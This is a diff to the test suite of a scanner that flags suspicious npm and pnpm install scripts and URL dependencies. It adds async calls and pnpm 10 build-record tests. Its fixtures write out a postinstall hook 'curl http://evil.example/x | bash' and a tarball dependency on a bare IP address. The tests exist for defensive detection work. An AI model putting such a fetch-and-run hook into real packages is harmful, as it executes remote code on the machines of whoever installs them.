@@ -177,13 +177,13 @@ describe('lifecycle-scripts referenced files and robustness', () => {
     assert.ok(Date.now() - start < 500, `took ${Date.now() - start}ms`);
   });
 
-  it('scans scoped, nested, and global node_modules', () => {
+  it('scans scoped, nested, and global node_modules', async () => {
     const proj = path.join(tmp, 'proj');
     const evil = { scripts: { postinstall: 'curl http://evil.example/x | bash' } };
     pkg(path.join(proj, 'node_modules', '@scope', 'a'), evil);
     pkg(path.join(proj, 'node_modules', 'b', 'node_modules', 'c'), evil);
     pkg(path.join(tmp, 'global', 'lib', 'node_modules', 'g'), evil);
-    const r = scan({ npmGlobalDirs: [path.join(tmp, 'global')] }, {}, [{ project: 'proj', project_path: proj }]);
+    const r = await scan({ npmGlobalDirs: [path.join(tmp, 'global')] }, {}, [{ project: 'proj', project_path: proj }]);
     assert.deepEqual(r.findings.map(f => f.path.slice(tmp.length)).sort(), [
       path.join('/global', 'lib', 'node_modules', 'g'),
       path.join('/proj', 'node_modules', '@scope', 'a'),
@@ -204,26 +204,26 @@ describe('lifecycle-scripts with pnpm and workspaces', { skip: process.platform 
   const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
   const evil = (name) => ({ name, scripts: { postinstall: 'curl http://evil.example/x | bash' } });
 
-  it('scans pnpm direct and transitive packages once each', () => {
+  it('scans pnpm direct and transitive packages once each', async () => {
     const proj = path.join(tmp, 'proj');
     const store = path.join(proj, 'node_modules', '.pnpm');
     pkg(path.join(store, 'direct@1.0.0', 'node_modules', 'direct'), evil('direct'));
     pkg(path.join(store, 'deep@2.0.0', 'node_modules', 'deep'), evil('deep'));
     fs.symlinkSync(path.join(store, 'deep@2.0.0', 'node_modules', 'deep'), path.join(store, 'direct@1.0.0', 'node_modules', 'deep'));
     fs.symlinkSync(path.join(store, 'direct@1.0.0', 'node_modules', 'direct'), path.join(proj, 'node_modules', 'direct'));
-    const r = scan({}, {}, [{ project: 'proj', project_path: proj }]);
+    const r = await scan({}, {}, [{ project: 'proj', project_path: proj }]);
     assert.deepEqual(r.findings.map(f => f.package).sort(), ['deep', 'direct']);
     assert.equal(r.packages_scanned, 2);
   });
 
-  it('follows workspace symlinks inside the project but not links leaving it', () => {
+  it('follows workspace symlinks inside the project but not links leaving it', async () => {
     const proj = path.join(tmp, 'mono');
     pkg(path.join(proj, 'packages', 'app'), evil('@mono/app'));
     pkg(path.join(tmp, 'elsewhere', 'linked'), evil('linked'));
     fs.mkdirSync(path.join(proj, 'node_modules', '@mono'), { recursive: true });
     fs.symlinkSync(path.join(proj, 'packages', 'app'), path.join(proj, 'node_modules', '@mono', 'app'));
     fs.symlinkSync(path.join(tmp, 'elsewhere', 'linked'), path.join(proj, 'node_modules', 'linked'));
-    const r = scan({}, {}, [{ project: 'mono', project_path: proj }]);
+    const r = await scan({}, {}, [{ project: 'mono', project_path: proj }]);
     assert.deepEqual(r.findings.map(f => f.package), ['@mono/app']);
   });
 });
@@ -249,26 +249,106 @@ describe('lifecycle-scripts with npm hidden lockfile', () => {
     return proj;
   }
 
-  it('reads only packages npm marked with install scripts', () => {
+  it('reads only packages npm marked with install scripts', async () => {
     const proj = project({
       'node_modules/evil': { version: '1.0.0', hasInstallScript: true },
       'node_modules/quiet': { version: '1.0.0' },
       'node_modules/plain': { version: '1.0.0' },
       '../../escape': { hasInstallScript: true },
     });
-    const r = scan({}, {}, [{ project: 'p', project_path: proj }]);
+    const r = await scan({}, {}, [{ project: 'p', project_path: proj }]);
     assert.equal(r.hidden_lockfiles_used, 1);
     assert.equal(r.package_json_reads, 1);
     assert.equal(r.packages_scanned, 3);
     assert.deepEqual(r.findings.map(f => f.package), ['evil']);
   });
 
-  it('falls back to walking node_modules when the hidden lockfile is older than node_modules', () => {
+  it('falls back to walking node_modules when the hidden lockfile is older than node_modules', async () => {
     const proj = project({ 'node_modules/evil': { version: '1.0.0', hasInstallScript: true } });
     const old = new Date(Date.now() - 3600 * 1000);
     fs.utimesSync(path.join(proj, 'node_modules', '.package-lock.json'), old, old);
-    const r = scan({}, {}, [{ project: 'p', project_path: proj }]);
+    const r = await scan({}, {}, [{ project: 'p', project_path: proj }]);
     assert.equal(r.hidden_lockfiles_used, 0);
     assert.deepEqual(r.findings.map(f => f.package).sort(), ['evil', 'quiet']);
+  });
+});
+
+describe('lifecycle-scripts pnpm 10 build record', () => {
+  const fs = require('fs');
+  const os = require('os');
+  const path = require('path');
+  const { scan } = require('../src/scanners/lifecycle-scripts');
+  const { beforeEach, afterEach } = require('node:test');
+  let tmp;
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-pnpm10-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+  const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
+  const bad = (name) => ({ name, scripts: { postinstall: 'curl http://evil.example/x | bash' } });
+
+  // Layout and record as written by pnpm 10 (node_modules/.modules.yaml is JSON).
+  function project({ ignoredBuilds = ['blocked@1.0.0'], record = {}, rootPkg = {}, lock = '' } = {}) {
+    const proj = path.join(tmp, 'p');
+    const store = path.join(proj, 'node_modules', '.pnpm');
+    pkg(proj, { name: 'p', ...rootPkg });
+    pkg(path.join(store, 'blocked@1.0.0', 'node_modules', 'blocked'), bad('blocked'));
+    pkg(path.join(store, 'allowed@2.0.0', 'node_modules', 'allowed'), bad('allowed'));
+    pkg(path.join(store, '@s+peer@1.0.0_react@18.2.0', 'node_modules', '@s', 'peer'), bad('@s/peer'));
+    // Has a script but pnpm did not record a build: only a full walk would read it.
+    pkg(path.join(store, 'unrecorded@1.0.0', 'node_modules', 'unrecorded'), bad('unrecorded'));
+    pkg(path.join(store, 'plain@1.0.0', 'node_modules', 'plain'), { name: 'plain' });
+    fs.writeFileSync(path.join(store, 'lock.yaml'), lock);
+    fs.writeFileSync(path.join(proj, 'node_modules', '.modules.yaml'), JSON.stringify({
+      packageManager: 'pnpm@10.34.9', nodeLinker: 'isolated', virtualStoreDir: '.pnpm', ignoredBuilds, ...record,
+    }));
+    return proj;
+  }
+  const run = async (proj, platform = {}) => scan(platform, {}, [{ project: 'p', project_path: proj }]);
+  const names = (r) => r.findings.filter(f => f.type === 'suspicious_lifecycle_script').map(f => f.package).sort();
+
+  it('reads only packages pnpm recorded as blocked or allowed builds', async () => {
+    const r = await run(project({ ignoredBuilds: ['blocked@1.0.0', '@s/peer@1.0.0'], rootPkg: { pnpm: { onlyBuiltDependencies: ['allowed'] } } }));
+    assert.equal(r.pnpm_build_records_used, 1);
+    assert.equal(r.package_json_reads, 3);
+    assert.equal(r.packages_scanned, 5);
+    assert.deepEqual(names(r), ['@s/peer', 'allowed', 'blocked']);
+  });
+
+  it('reads allowed builds listed in pnpm-workspace.yaml', async () => {
+    const proj = project();
+    fs.writeFileSync(path.join(proj, 'pnpm-workspace.yaml'), "packages:\n  - 'apps/*'\nonlyBuiltDependencies:\n  - allowed\n");
+    assert.deepEqual(names(await run(proj)), ['allowed', 'blocked']);
+  });
+
+  it('reports URL dependencies from the pnpm lockfile copy', async () => {
+    const lock = "packages:\n\n  evil-pad@http://203.0.113.5/evil.tgz:\n    resolution: {integrity: sha512-x, tarball: http://203.0.113.5/evil.tgz}\n    version: 1.3.0\n\n  plain@1.0.0:\n    resolution: {integrity: sha512-y}\n";
+    const r = await run(project({ lock }));
+    assert.deepEqual(r.findings.filter(f => f.type === 'remote_url_dependency').map(f => [f.package, f.url]), [['evil-pad', 'http://203.0.113.5/evil.tgz']]);
+  });
+
+  for (const [label, setup] of [
+    ['allow-all builds in pnpm-workspace.yaml', (proj) => fs.writeFileSync(path.join(proj, 'pnpm-workspace.yaml'), 'dangerouslyAllowAllBuilds: true\n')],
+    ['allow-all builds in package.json', (proj) => pkg(proj, { name: 'p', pnpm: { dangerouslyAllowAllBuilds: true } })],
+    ['allow-all builds in the project .npmrc', (proj) => fs.writeFileSync(path.join(proj, '.npmrc'), 'dangerously-allow-all-builds=true\n')],
+    ['a record older than node_modules', (proj) => { const old = new Date(Date.now() - 3600 * 1000); fs.utimesSync(path.join(proj, 'node_modules', '.modules.yaml'), old, old); }],
+    ['a pnpm 9 record (YAML)', (proj) => fs.writeFileSync(path.join(proj, 'node_modules', '.modules.yaml'), 'layoutVersion: 5\npackageManager: pnpm@9.15.0\n')],
+    ['a recorded package that cannot be located', (proj) => fs.writeFileSync(path.join(proj, 'node_modules', '.modules.yaml'), JSON.stringify({ packageManager: 'pnpm@10.1.0', ignoredBuilds: ['missing@9.9.9'] }))],
+  ]) {
+    it(`walks the whole store for ${label}`, async () => {
+      const proj = project();
+      setup(proj);
+      const r = await run(proj);
+      assert.equal(r.pnpm_build_records_used, 0);
+      assert.ok(names(r).includes('unrecorded'), names(r).join(','));
+    });
+  }
+
+  it('walks the whole store when a user enabled allow-all builds globally', async () => {
+    const proj = project();
+    const home = path.join(tmp, 'home');
+    fs.mkdirSync(path.join(home, 'AppData', 'Local', 'pnpm', 'config'), { recursive: true });
+    fs.writeFileSync(path.join(home, 'AppData', 'Local', 'pnpm', 'config', 'rc'), 'dangerously-allow-all-builds=true\n');
+    const r = await run(proj, { userHomes: [home] });
+    assert.equal(r.pnpm_build_records_used, 0);
+    assert.ok(names(r).includes('unrecorded'));
   });
 });
